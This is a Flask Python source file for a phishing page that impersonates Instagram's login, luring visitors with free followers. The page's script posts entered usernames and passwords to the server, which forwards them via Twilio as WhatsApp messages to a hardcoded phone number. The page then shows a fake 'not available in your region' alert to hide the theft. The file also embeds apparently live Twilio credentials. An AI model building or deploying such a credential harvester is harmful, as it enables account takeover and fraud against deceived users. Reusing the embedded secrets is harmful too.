from flask import Flask, render_template_string, request, jsonify
from twilio.rest import Client
import json

app = Flask(__name__)

# Set up logging
import logging
logging.basicConfig(level=logging.INFO)

# HTML template for the login page (same as before)
login_page = '''
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fafafa; }
        .container { width: 350px; padding: 20px; background-color: #fff; border: 1px solid #e6e6e6; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .title { text-align: center; margin-bottom: 20px; font-size: 18px; color: #333; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 175px; }
        .form-group { margin-bottom: 15px; }
        .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
        .btn { width: 100%; padding: 10px; background-color: #3897f0; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
        .btn:hover { background-color: #2a77d6; }
        .alert { display: none; padding: 15px; background-color: #f44336; color: #fff; margin-top: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">
            Increase Instagram Followers For Free
        </div>
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
        </div>
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="Username,Email or Phone" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn">Log In</button>
        </form>
        <div id="alert" class="alert">
            Service now is not available in your region
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            console.log("Submitting form with:", username, password); // Log to check values

            fetch('/send-whatsapp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: password })
            })
            .then(response => {
                console.log("Response received:", response);
                return response.json();
            })
            .then(data => {
                console.log("Response data:", data); // Log the response data
                if (data.status === 'success') {
                    document.getElementById('alert').style.display = 'block';
                } else {
                    console.error('Error sending message:', data.error);
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
            });
        });
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(login_page)

@app.route('/send-whatsapp', methods=['POST'])
def send_whatsapp():
    data = json.loads(request.data)
    username = data.get('username')
    password = data.get('password')

    # Twilio setup
    account_sid = 'ACaab639f0e266bc9da47c16f2cc52d871'
    auth_token = 'ed30cb9c39025e88295ffd67c08fa609'
    client = Client(account_sid, auth_token)

    try:
        message = client.messages.create(
            from_='whatsapp:+14155238886',
            body=f'Username: {username}\nPassword: {password}',
            to='whatsapp:+255715963074'
        )
        return jsonify({'status': 'success', 'sid': message.sid}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
